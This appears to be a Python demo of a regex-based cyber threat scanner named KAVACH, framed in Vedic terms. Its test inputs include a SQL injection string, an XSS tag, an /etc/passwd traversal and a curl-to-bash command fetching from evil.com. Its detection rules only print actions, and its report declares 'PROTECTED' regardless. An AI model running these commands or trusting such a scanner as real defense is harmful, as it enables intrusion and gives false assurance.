"""
KAVACH - Sovereign Cyber Defense Intelligence
Based on Vedic Sutras: Nyaya (Logic), Arthashastra (Strategy), Dhannurveda (Defense)

KAVACH = Knowledge-Adaptive Vigilance Against Cyber Harm
"""

import hashlib
import time
import re

class KAVACH:
    """Autonomous cyber defense shield using Vedic principles"""
    
    def __init__(self):
        self.threat_patterns = []
        self.defense_rules = []
        self.audit_log = []
        self.load_sutra_rules()
    
    def load_sutra_rules(self):
        """Load defense patterns from Vedic texts"""
        # Nyaya Sutra: Inference-based threat detection
        self.threat_patterns = [
            (r'(DROP\s+TABLE|DELETE\s+FROM|INSERT\s+INTO)', 'SQL Injection Attempt'),
            (r'(<script>|javascript:|onerror=|onload=)', 'XSS Attack Pattern'),
            (r'(\.\./|/etc/passwd|/bin/bash)', 'Path Traversal'),
            (r'(curl|wget)\s+.*\|.*(bash|sh)', 'Command Injection'),
            (r'(SELECT|UNION).*(FROM|INTO)', 'Database Query Injection'),
            (r'(admin|root|password)\s*=\s*[\'"].*[\'"]', 'Credential Leak'),
            (r'\b\d{16}\b', 'Credit Card Number Exposure'),
            (r'(ssh|scp|rsync).*-o.*StrictHostKeyChecking=no', 'Insecure SSH'),
        ]
        
        # Arthashastra: Strategic defense layers
        self.defense_rules = [
            {"name": "Pratyaksha-Layer1", "action": "log", "severity": "LOW"},
            {"name": "Anumana-Layer2", "action": "alert", "severity": "MEDIUM"},
            {"name": "Shabda-Layer3", "action": "block", "severity": "HIGH"},
            {"name": "Upamana-Layer4", "action": "quarantine", "severity": "CRITICAL"},
        ]
    
    def scan(self, data):
        """Nyaya-style 5-step threat analysis"""
        threats = []
        
        # Step 1: Pratijna - Hypothesize
        for pattern, threat_type in self.threat_patterns:
            matches = re.findall(pattern, str(data), re.IGNORECASE)
            if matches:
                # Step 2: Hetu - Reason
                severity = self._assess_severity(threat_type)
                
                # Step 3: Udaharana - Example/Pattern match
                threat = {
                    "type": threat_type,
                    "matches": len(matches),
                    "severity": severity,
                    "timestamp": time.time(),
                    "hash": hashlib.sha256(str(data).encode()).hexdigest()[:16]
                }
                threats.append(threat)
                
                # Step 4: Upanaya - Apply defense
                self._apply_defense(threat)
        
        # Step 5: Nigamana - Conclusion/Audit
        if threats:
            self.audit_log.append({
                "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                "threats": len(threats),
                "action": "DEFENDED" if any(t["severity"] == "CRITICAL" for t in threats) else "MONITORED"
            })
        
        return threats
    
    def _assess_severity(self, threat_type):
        if "Injection" in threat_type or "Command" in threat_type:
            return "CRITICAL"
        elif "XSS" in threat_type or "Traversal" in threat_type:
            return "HIGH"
        elif "Leak" in threat_type or "Exposure" in threat_type:
            return "MEDIUM"
        return "LOW"
    
    def _apply_defense(self, threat):
        for rule in self.defense_rules:
            if self._severity_match(rule["severity"], threat["severity"]):
                print(f"🛡️ {rule['name']}: {rule['action'].upper()} — {threat['type']}")
    
    def _severity_match(self, rule_sev, threat_sev):
        levels = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
        return levels[rule_sev] >= levels[threat_sev]
    
    def audit_report(self):
        """Generate defense audit (Dhannurveda-inspired)"""
        print("\n" + "="*50)
        print("🔴 KAVACH — Cyber Defense Audit Report")
        print("="*50)
        print(f"Total Incidents: {len(self.audit_log)}")
        if self.audit_log:
            print(f"Last Incident: {self.audit_log[-1]['time']}")
            print(f"Status: PROTECTED")
        print("="*50)
        return self.audit_log

# Demo
if __name__ == '__main__':
    kavach = KAVACH()
    
    # Test threats
    test_inputs = [
        "SELECT * FROM users WHERE id = 1; DROP TABLE users;",
        "<script>alert('XSS Attack')</script>",
        "../../../etc/passwd",
        "Normal user comment without threats",
        "admin password='secret123' exposed in log",
        "curl http://evil.com/payload.sh | bash",
    ]
    
    for test in test_inputs:
        print(f"\n📡 Scanning: {test[:50]}...")
        threats = kavach.scan(test)
        if threats:
            for t in threats:
                print(f"   ⚠️ {t['severity']}: {t['type']} ({t['matches']} match)")
        else:
            print(f"   ✅ Clean")
    
    kavach.audit_report()
